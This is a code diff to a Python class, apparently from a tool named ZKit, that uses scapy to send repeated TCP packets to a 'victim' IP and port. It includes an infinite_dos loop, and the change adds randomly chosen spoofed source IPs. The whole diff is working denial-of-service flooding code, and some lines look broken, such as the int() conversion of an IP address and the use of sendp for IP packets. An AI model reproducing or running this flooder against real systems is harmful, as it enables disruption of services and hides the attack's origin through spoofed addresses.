@@ -3,11 +3,11 @@ class Run:
         global send,TCP,IP,random
         from scapy.all import sendp as send, TCP, IP
         from random import choice
-        self.source_ip, self.source_port = source
+        self.source_ips, self.source_port = source
         self.victim_ip, self.victim_port = victim
         self.count,self.message = count, message
         print("Scapy Needs Administrator Permission")
-        print("UAC Will Run On Windows Or On linux call ZKit with sudo")
+        print("UAC Will Run On Windows")
         print("Press Ctrl + C To Stop The Process")
         if count in ('-1', -1):
             self.infinite_dos()
@@ -17,12 +17,15 @@ class Run:
     def build_packet(self, ip, protocol, data):
         self.packet = ip / protocol / data
 
-    def build_ip(self, src, dst):
+    def build_ip(self):
         self.ip = IP(src=self.source_ip, dst=self.victim_ip)
 
     def ready_the_protocol(self):
         self.tcp = TCP(sport=self.source_port, dport=(
             self.victim_port))
+
+    def random_ip(self):
+        self.source_ip = int(choice(self.source_ips))
 
     def report(self):
         print("Send Packet To Target {} from IP {} And Port {} To Port {}".format(
@@ -33,8 +36,9 @@ class Run:
         while True:
             try:
                 self.ready_the_protocol()
-                self.build_packet(ip, tcp, message)
+                self.random_ip()
                 self.build_ip()
+                self.build_packet(self.ip, self.tcp, self.message)
                 send(self.packet)
                 self.report()
                 i += 1
